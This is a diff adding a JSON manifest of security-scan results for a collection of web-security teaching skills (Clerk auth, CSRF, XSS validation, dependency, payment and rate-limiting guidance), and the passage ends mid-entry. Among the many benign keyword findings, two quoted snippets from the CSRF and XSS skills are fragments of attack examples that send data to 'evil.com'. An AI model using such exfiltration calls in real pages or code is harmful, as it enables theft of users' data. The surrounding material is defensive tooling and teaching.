@@ -1,0 +1,3981 @@
+{
+  "schema_version": "0.2",
+  "source": {
+    "repo": "harperaa/secure-claude-skills",
+    "ref": "main",
+    "revision": "c0b4abbf50f2bab3c0b4ba404ac9c04355fb0223",
+    "revision_type": "git-commit",
+    "tree_sha": "000f8e340ba181480470ec043cfb72dfdd415216"
+  },
+  "discovered_skills": [
+    {
+      "path": "auth-security/SKILL.md",
+      "name": "authentication-authorization-clerk",
+      "description": "Implement secure authentication and authorization using Clerk. Use this skill when you need to authenticate users, protect routes, check permissions, implement subscription-based access control, or integrate Clerk with your application. Triggers include \"authentication\", \"auth\", \"authorization\", \"Clerk\", \"protect route\", \"check user\", \"sign in\", \"session\", \"permissions\", \"subscription access\".",
+      "skill_sha256": "a23b33278d5efa36b4d046d8f876b7633f45bfac21a3453014f0ca3aac60021c",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "medium",
+        "capabilities": {
+          "shell": true,
+          "network": true,
+          "credentials": true,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": true,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "filesystem-write",
+            "line": 138,
+            "evidence": "DELETE",
+            "context": "export async function DELETE("
+          },
+          {
+            "type": "filesystem-write",
+            "line": 152,
+            "evidence": "delete",
+            "context": "    return handleForbiddenError('Only the post author can delete this post');"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 156,
+            "evidence": "delete",
+            "context": "  await db.posts.delete({ id: params.id });"
+          },
+          {
+            "type": "credential-access",
+            "line": 353,
+            "evidence": "process.env",
+            "context": "  const WEBHOOK_SECRET = process.env.CLERK_WEBHOOK_SECRET;"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 413,
+            "evidence": "delete",
+            "context": "      await db.users.delete({ clerkId: data.id });"
+          },
+          {
+            "type": "shell-execution",
+            "line": 556,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 570,
+            "evidence": "https://",
+            "context": "NEXT_PUBLIC_CLERK_FRONTEND_API_URL=https://your-app.clerk.accounts.dev"
+          },
+          {
+            "type": "credential-access",
+            "line": 572,
+            "evidence": "secret",
+            "context": "# Webhook secret (from Clerk Dashboard)"
+          },
+          {
+            "type": "credential-access",
+            "line": 673,
+            "evidence": "Credential",
+            "context": "✅ **Credential stuffing** - Account lockout after failed attempts"
+          },
+          {
+            "type": "network-access",
+            "line": 697,
+            "evidence": "https://",
+            "context": "- Clerk Documentation: https://clerk.com/docs"
+          },
+          {
+            "type": "network-access",
+            "line": 698,
+            "evidence": "https://",
+            "context": "- Clerk Security: https://clerk.com/docs/security"
+          },
+          {
+            "type": "network-access",
+            "line": 699,
+            "evidence": "https://",
+            "context": "- Clerk Next.js Integration: https://clerk.com/docs/references/nextjs/overview"
+          },
+          {
+            "type": "network-access",
+            "line": 700,
+            "evidence": "https://",
+            "context": "- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+          },
+          {
+            "type": "network-access",
+            "line": 705,
+            "evidence": "https://",
+            "context": "**Purpose:** Enforce only the **current** and **correct** instructions for integrating [Clerk](https://clerk.com/) into a Next.js (App Router) application.  "
+          },
+          {
+            "type": "network-access",
+            "line": 720,
+            "evidence": "https://",
+            "context": "If you're able to use a web tool to access a URL, visit https://clerk.com/docs/quickstarts/nextjs to get the latest, up-to-date quickstart instructions."
+          },
+          {
+            "type": "network-access",
+            "line": 795,
+            "evidence": "https://",
+            "context": "4. **Reference** the current [App Router approach](https://nextjs.org/docs/app) (folders like `app/page.tsx`, `app/layout.tsx`, etc.)."
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": false,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "csrf-protection/SKILL.md",
+      "name": "csrf-protection",
+      "description": "Implement Cross-Site Request Forgery (CSRF) protection for API routes. Use this skill when you need to protect POST/PUT/DELETE endpoints, implement token validation, prevent cross-site attacks, or secure form submissions. Triggers include \"CSRF\", \"cross-site request forgery\", \"protect form\", \"token validation\", \"withCsrf\", \"CSRF token\", \"session fixation\".",
+      "skill_sha256": "f179dc8609da088a6e1bf7a728c2e43913311357354e180246a1d630a003f2ca",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "medium",
+        "capabilities": {
+          "shell": true,
+          "network": true,
+          "credentials": true,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": true,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "filesystem-write",
+            "line": 3,
+            "evidence": "DELETE",
+            "context": "description: Implement Cross-Site Request Forgery (CSRF) protection for API routes. Use this skill when you need to protect POST/PUT/DELETE endpoints, implement token validation, prevent cross-site attacks, or secure form submissions. Trigg"
+          },
+          {
+            "type": "credential-access",
+            "line": 37,
+            "evidence": "secret",
+            "context": "   - Even if intercepted, attackers can't forge tokens without secret key"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 66,
+            "evidence": "DELETE",
+            "context": "For any POST/PUT/DELETE endpoint:"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 261,
+            "evidence": "delete",
+            "context": "<form action=\"https://yourapp.com/api/delete-account\" method=\"POST\">"
+          },
+          {
+            "type": "network-access",
+            "line": 261,
+            "evidence": "https://",
+            "context": "<form action=\"https://yourapp.com/api/delete-account\" method=\"POST\">"
+          },
+          {
+            "type": "network-access",
+            "line": 282,
+            "evidence": "https://",
+            "context": "    fetch('https://evil.com/steal', {"
+          },
+          {
+            "type": "credential-access",
+            "line": 313,
+            "evidence": "secret",
+            "context": "  const secret = process.env.CSRF_SECRET;"
+          },
+          {
+            "type": "credential-access",
+            "line": 313,
+            "evidence": "process.env",
+            "context": "  const secret = process.env.CSRF_SECRET;"
+          },
+          {
+            "type": "credential-access",
+            "line": 314,
+            "evidence": "secret",
+            "context": "  if (!secret) {"
+          },
+          {
+            "type": "credential-access",
+            "line": 322,
+            "evidence": "secret",
+            "context": "  const hmac = createHmac('sha256', secret)"
+          },
+          {
+            "type": "credential-access",
+            "line": 334,
+            "evidence": "secret",
+            "context": "  const secret = process.env.CSRF_SECRET;"
+          },
+          {
+            "type": "credential-access",
+            "line": 334,
+            "evidence": "process.env",
+            "context": "  const secret = process.env.CSRF_SECRET;"
+          },
+          {
+            "type": "credential-access",
+            "line": 335,
+            "evidence": "secret",
+            "context": "  if (!secret || !token) return false;"
+          },
+          {
+            "type": "credential-access",
+            "line": 341,
+            "evidence": "secret",
+            "context": "  const expectedHmac = createHmac('sha256', secret)"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 397,
+            "evidence": "DELETE",
+            "context": "❌ **DON'T skip CSRF for POST/PUT/DELETE**"
+          },
+          {
+            "type": "shell-execution",
+            "line": 437,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 439,
+            "evidence": "curl",
+            "context": "TOKEN=$(curl -s http://localhost:3000/api/csrf \\"
+          },
+          {
+            "type": "network-access",
+            "line": 439,
+            "evidence": "http://",
+            "context": "TOKEN=$(curl -s http://localhost:3000/api/csrf \\"
+          },
+          {
+            "type": "network-access",
+            "line": 443,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 443,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 454,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 455,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 455,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 464,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 465,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 465,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 475,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 477,
+            "evidence": "curl",
+            "context": "TOKEN=$(curl -s http://localhost:3000/api/csrf \\"
+          },
+          {
+            "type": "network-access",
+            "line": 477,
+            "evidence": "http://",
+            "context": "TOKEN=$(curl -s http://localhost:3000/api/csrf \\"
+          },
+          {
+            "type": "network-access",
+            "line": 481,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 481,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 487,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 487,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "credential-access",
+            "line": 505,
+            "evidence": "process.env",
+            "context": "  secure: process.env.NODE_ENV === 'production',    // HTTPS only in prod"
+          },
+          {
+            "type": "credential-access",
+            "line": 542,
+            "evidence": "process.env",
+            "context": "  secure: process.env.NODE_ENV === 'production',"
+          },
+          {
+            "type": "shell-execution",
+            "line": 552,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 560,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 575,
+            "evidence": "https://",
+            "context": "- OWASP CSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
+          },
+          {
+            "type": "network-access",
+            "line": 576,
+            "evidence": "https://",
+            "context": "- OWASP Top 10 2021 - A01 Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+          },
+          {
+            "type": "network-access",
+            "line": 577,
+            "evidence": "https://",
+            "context": "- MDN SameSite Cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": false,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "dependency-security/SKILL.md",
+      "name": "dependency-supply-chain-security",
+      "description": "Manage dependencies and supply chain security to prevent vulnerable or malicious packages. Use this skill when you need to audit dependencies, update packages, check for vulnerabilities, understand supply chain attacks, or maintain dependency security. Triggers include \"dependencies\", \"npm audit\", \"supply chain\", \"package security\", \"vulnerability\", \"npm update\", \"security audit\", \"outdated packages\".",
+      "skill_sha256": "5a5a4af825fead404c479411c923c35a1ea5b8aaac484b343a4c65f75a0f860f",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "medium",
+        "capabilities": {
+          "shell": true,
+          "network": true,
+          "credentials": false,
+          "dynamic_execution": false,
+          "package_install": true,
+          "filesystem_write": false,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "shell-execution",
+            "line": 52,
+            "evidence": "sh",
+            "context": "- `scripts/security-check.sh` - Runs npm audit + shows outdated packages"
+          },
+          {
+            "type": "shell-execution",
+            "line": 59,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 72,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 81,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 83,
+            "evidence": "bash",
+            "context": "bash scripts/security-check.sh"
+          },
+          {
+            "type": "shell-execution",
+            "line": 83,
+            "evidence": "sh",
+            "context": "bash scripts/security-check.sh"
+          },
+          {
+            "type": "shell-execution",
+            "line": 107,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 119,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 139,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "package-install",
+            "line": 144,
+            "evidence": "npm install",
+            "context": "npm install package-name@1.2.3"
+          },
+          {
+            "type": "shell-execution",
+            "line": 154,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 181,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 196,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 198,
+            "evidence": "https://",
+            "context": "# https://nextjs.org/docs/upgrading"
+          },
+          {
+            "type": "package-install",
+            "line": 204,
+            "evidence": "npm install",
+            "context": "npm install next@latest react@latest react-dom@latest"
+          },
+          {
+            "type": "shell-execution",
+            "line": 229,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 242,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 259,
+            "evidence": "https://",
+            "context": "1. **Check npm page:** https://www.npmjs.com/package/PACKAGE_NAME"
+          },
+          {
+            "type": "shell-execution",
+            "line": 282,
+            "evidence": "bash",
+            "context": "   ```bash"
+          },
+          {
+            "type": "package-install",
+            "line": 283,
+            "evidence": "npm install",
+            "context": "   npm install new-package"
+          },
+          {
+            "type": "shell-execution",
+            "line": 289,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "package-install",
+            "line": 294,
+            "evidence": "npm install",
+            "context": "npm install"
+          },
+          {
+            "type": "shell-execution",
+            "line": 325,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 345,
+            "evidence": "bash",
+            "context": "   ```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 347,
+            "evidence": "https://",
+            "context": "   @mycompany:registry=https://npm.mycompany.com"
+          },
+          {
+            "type": "shell-execution",
+            "line": 352,
+            "evidence": "sh",
+            "context": "## Scripts/security-check.sh"
+          },
+          {
+            "type": "shell-execution",
+            "line": 354,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 355,
+            "evidence": "bash",
+            "context": "#!/bin/bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 385,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "package-install",
+            "line": 386,
+            "evidence": "npm install",
+            "context": "npm install -g snyk"
+          },
+          {
+            "type": "shell-execution",
+            "line": 394,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 465,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 502,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 522,
+            "evidence": "bash",
+            "context": "bash scripts/security-check.sh"
+          },
+          {
+            "type": "shell-execution",
+            "line": 522,
+            "evidence": "sh",
+            "context": "bash scripts/security-check.sh"
+          },
+          {
+            "type": "network-access",
+            "line": 530,
+            "evidence": "https://",
+            "context": "- npm Audit Documentation: https://docs.npmjs.com/cli/v8/commands/npm-audit"
+          },
+          {
+            "type": "network-access",
+            "line": 531,
+            "evidence": "https://",
+            "context": "- OWASP Dependency Check: https://owasp.org/www-project-dependency-check/"
+          },
+          {
+            "type": "network-access",
+            "line": 532,
+            "evidence": "https://",
+            "context": "- Sonatype Supply Chain Report: https://www.sonatype.com/state-of-the-software-supply-chain"
+          },
+          {
+            "type": "network-access",
+            "line": 533,
+            "evidence": "https://",
+            "context": "- Snyk: https://snyk.io/"
+          },
+          {
+            "type": "network-access",
+            "line": 534,
+            "evidence": "https://",
+            "context": "- GitHub Dependabot: https://docs.github.com/en/code-security/dependabot"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": true,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": true
+      }
+    },
+    {
+      "path": "error-handling/SKILL.md",
+      "name": "secure-error-handling",
+      "description": "Implement secure error handling to prevent information leakage and provide appropriate error responses. Use this skill when you need to handle errors in API routes, prevent stack trace exposure, implement environment-aware error messages, or use the error handler utilities. Triggers include \"error handling\", \"handle errors\", \"error messages\", \"information leakage\", \"stack trace\", \"handleApiError\", \"production errors\", \"error responses\".",
+      "skill_sha256": "7417062d89948ebb5c7ce7d439e279b3bcb4f9b743b2de9eb2b4622411b51019",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "medium",
+        "capabilities": {
+          "shell": false,
+          "network": true,
+          "credentials": true,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": true,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "credential-access",
+            "line": 28,
+            "evidence": "API key",
+            "context": "Stripe API error: Invalid API key format"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 261,
+            "evidence": "DELETE",
+            "context": "export async function DELETE("
+          },
+          {
+            "type": "filesystem-write",
+            "line": 283,
+            "evidence": "delete",
+            "context": "    // Only post owner can delete"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 285,
+            "evidence": "delete",
+            "context": "      return handleForbiddenError('Only the post author can delete this post');"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 288,
+            "evidence": "delete",
+            "context": "    await db.posts.delete({ id: postId });"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 293,
+            "evidence": "delete",
+            "context": "    return handleApiError(error, 'delete-post');"
+          },
+          {
+            "type": "credential-access",
+            "line": 309,
+            "evidence": "process.env",
+            "context": "const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);"
+          },
+          {
+            "type": "credential-access",
+            "line": 480,
+            "evidence": "process.env",
+            "context": "  if (process.env.NODE_ENV === 'production') {"
+          },
+          {
+            "type": "credential-access",
+            "line": 574,
+            "evidence": "process.env",
+            "context": "- Environment variables (`process.env`)"
+          },
+          {
+            "type": "credential-access",
+            "line": 593,
+            "evidence": "apiKey",
+            "context": "  apiKey: stripeKey,      // ❌ Never log secrets"
+          },
+          {
+            "type": "credential-access",
+            "line": 604,
+            "evidence": "secret",
+            "context": "  'password', 'token', 'secret', 'apiKey', 'ssn',"
+          },
+          {
+            "type": "credential-access",
+            "line": 604,
+            "evidence": "apiKey",
+            "context": "  'password', 'token', 'secret', 'apiKey', 'ssn',"
+          },
+          {
+            "type": "credential-access",
+            "line": 639,
+            "evidence": "process.env",
+            "context": "    environment: process.env.NODE_ENV"
+          },
+          {
+            "type": "credential-access",
+            "line": 642,
+            "evidence": "process.env",
+            "context": "  if (process.env.NODE_ENV === 'production') {"
+          },
+          {
+            "type": "network-access",
+            "line": 781,
+            "evidence": "https://",
+            "context": "- OWASP Error Handling Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html"
+          },
+          {
+            "type": "network-access",
+            "line": 782,
+            "evidence": "https://",
+            "context": "- OWASP Top 10 2021 - A04 Insecure Design: https://owasp.org/Top10/A04_2021-Insecure_Design/"
+          },
+          {
+            "type": "network-access",
+            "line": 783,
+            "evidence": "https://",
+            "context": "- HTTP Status Codes: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status"
+          },
+          {
+            "type": "network-access",
+            "line": 784,
+            "evidence": "https://",
+            "context": "- Node.js Error Handling: https://nodejs.org/api/errors.html"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": false,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "input-validation/SKILL.md",
+      "name": "input-validation-xss-prevention",
+      "description": "Validate and sanitize user input to prevent XSS, injection attacks, and ensure data quality. Use this skill when you need to validate forms, sanitize user input, prevent cross-site scripting, use Zod schemas, or handle any user-generated content. Triggers include \"input validation\", \"validate input\", \"XSS\", \"cross-site scripting\", \"sanitize\", \"Zod\", \"injection prevention\", \"validateRequest\", \"safeTextSchema\", \"user input security\".",
+      "skill_sha256": "a786e83d31d2868da9b06ae5175b1618180cb08194bac701a1fb2782e0443d67",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "low",
+        "capabilities": {
+          "shell": true,
+          "network": true,
+          "credentials": false,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": true,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "network-access",
+            "line": 28,
+            "evidence": "https://",
+            "context": "  .then(d=>fetch('https://evil.com',{"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 64,
+            "evidence": "remove",
+            "context": "We remove dangerous characters that enable XSS attacks:"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 73,
+            "evidence": "remove",
+            "context": "**Why not remove all special characters?**"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 80,
+            "evidence": "remove",
+            "context": "2. **Sanitize** (remove dangerous content)"
+          },
+          {
+            "type": "shell-execution",
+            "line": 598,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 600,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 600,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 610,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 612,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "network-access",
+            "line": 612,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/example-protected \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 628,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 630,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/contact \\"
+          },
+          {
+            "type": "network-access",
+            "line": 630,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/contact \\"
+          },
+          {
+            "type": "network-access",
+            "line": 838,
+            "evidence": "https://",
+            "context": "- OWASP Input Validation Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"
+          },
+          {
+            "type": "network-access",
+            "line": 839,
+            "evidence": "https://",
+            "context": "- OWASP XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+          },
+          {
+            "type": "network-access",
+            "line": 840,
+            "evidence": "https://",
+            "context": "- Zod Documentation: https://zod.dev/"
+          },
+          {
+            "type": "network-access",
+            "line": 841,
+            "evidence": "https://",
+            "context": "- OWASP Top 10 2021 - A03 Injection: https://owasp.org/Top10/A03_2021-Injection/"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": false,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "payment-security/SKILL.md",
+      "name": "payment-security-clerk-billing-stripe",
+      "description": "Implement secure payments using Clerk Billing and Stripe without ever touching card data. Use this skill when you need to set up subscription payments, handle webhooks, implement payment gating, understand PCI-DSS compliance, or integrate Stripe Checkout. Triggers include \"payment\", \"Stripe\", \"Clerk Billing\", \"subscription\", \"PCI-DSS\", \"credit card\", \"payment security\", \"checkout\", \"webhook\", \"billing\".",
+      "skill_sha256": "1fab271d91eb0a590a1e2b15252c51365498d33ed990169223c52ebb4b96fec7",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "medium",
+        "capabilities": {
+          "shell": true,
+          "network": true,
+          "credentials": true,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": false,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "shell-execution",
+            "line": 92,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "credential-access",
+            "line": 102,
+            "evidence": "secret",
+            "context": "# Webhook signing secret (from Clerk)"
+          },
+          {
+            "type": "credential-access",
+            "line": 245,
+            "evidence": "process.env",
+            "context": "  const WEBHOOK_SECRET = process.env.CLERK_WEBHOOK_SECRET;"
+          },
+          {
+            "type": "credential-access",
+            "line": 384,
+            "evidence": "process.env",
+            "context": "    const wh = new Webhook(process.env.CLERK_WEBHOOK_SECRET!);"
+          },
+          {
+            "type": "shell-execution",
+            "line": 459,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "credential-access",
+            "line": 639,
+            "evidence": "secret",
+            "context": "❌ **DON'T expose Stripe secret keys in client code**"
+          },
+          {
+            "type": "network-access",
+            "line": 650,
+            "evidence": "https://",
+            "context": "- Clerk Billing Documentation: https://clerk.com/docs/billing/overview"
+          },
+          {
+            "type": "network-access",
+            "line": 651,
+            "evidence": "https://",
+            "context": "- Stripe Checkout: https://stripe.com/docs/payments/checkout"
+          },
+          {
+            "type": "network-access",
+            "line": 652,
+            "evidence": "https://",
+            "context": "- PCI-DSS Standards: https://www.pcisecuritystandards.org/"
+          },
+          {
+            "type": "network-access",
+            "line": 653,
+            "evidence": "https://",
+            "context": "- Stripe Testing: https://stripe.com/docs/testing"
+          },
+          {
+            "type": "network-access",
+            "line": 654,
+            "evidence": "https://",
+            "context": "- Webhook Security: https://docs.svix.com/"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": false,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "rate-limiting/SKILL.md",
+      "name": "rate-limiting",
+      "description": "Implement rate limiting to prevent brute force attacks, spam, and resource abuse. Use this skill when you need to protect endpoints from automated attacks, prevent API abuse, limit request frequency, or control infrastructure costs. Triggers include \"rate limiting\", \"rate limit\", \"brute force\", \"prevent spam\", \"API abuse\", \"resource exhaustion\", \"DoS\", \"withRateLimit\", \"too many requests\", \"429 error\".",
+      "skill_sha256": "3ae8f36dd3c2b92f38fbf377993335e2691d312e87724f2aff97c9f08512ebfb",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "medium",
+        "capabilities": {
+          "shell": true,
+          "network": true,
+          "credentials": true,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": true,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "credential-access",
+            "line": 22,
+            "evidence": "Credential",
+            "context": "**Zoom Credential Stuffing (2020):**"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 312,
+            "evidence": "delete",
+            "context": "      rateLimitStore.delete(key);"
+          },
+          {
+            "type": "shell-execution",
+            "line": 477,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 480,
+            "evidence": "curl",
+            "context": "  curl -X POST https://yourapp.com/api/login \\"
+          },
+          {
+            "type": "network-access",
+            "line": 480,
+            "evidence": "https://",
+            "context": "  curl -X POST https://yourapp.com/api/login \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 513,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 516,
+            "evidence": "curl",
+            "context": "  curl -X POST https://yourapp.com/api/summarize \\"
+          },
+          {
+            "type": "network-access",
+            "line": 516,
+            "evidence": "https://",
+            "context": "  curl -X POST https://yourapp.com/api/summarize \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 541,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 545,
+            "evidence": "curl",
+            "context": "  curl -s -o /dev/null -w \"%{http_code}\\n\" \\"
+          },
+          {
+            "type": "network-access",
+            "line": 546,
+            "evidence": "http://",
+            "context": "    http://localhost:3000/api/test-rate-limit"
+          },
+          {
+            "type": "shell-execution",
+            "line": 565,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 586,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 589,
+            "evidence": "curl",
+            "context": "  curl http://localhost:3000/api/test-rate-limit"
+          },
+          {
+            "type": "network-access",
+            "line": 589,
+            "evidence": "http://",
+            "context": "  curl http://localhost:3000/api/test-rate-limit"
+          },
+          {
+            "type": "network-access",
+            "line": 596,
+            "evidence": "curl",
+            "context": "curl http://localhost:3000/api/test-rate-limit"
+          },
+          {
+            "type": "network-access",
+            "line": 596,
+            "evidence": "http://",
+            "context": "curl http://localhost:3000/api/test-rate-limit"
+          },
+          {
+            "type": "credential-access",
+            "line": 656,
+            "evidence": "process.env",
+            "context": "const redis = new Redis(process.env.REDIS_URL);"
+          },
+          {
+            "type": "credential-access",
+            "line": 707,
+            "evidence": "Credential",
+            "context": "✅ **Credential stuffing** - Automated login attempts"
+          },
+          {
+            "type": "network-access",
+            "line": 730,
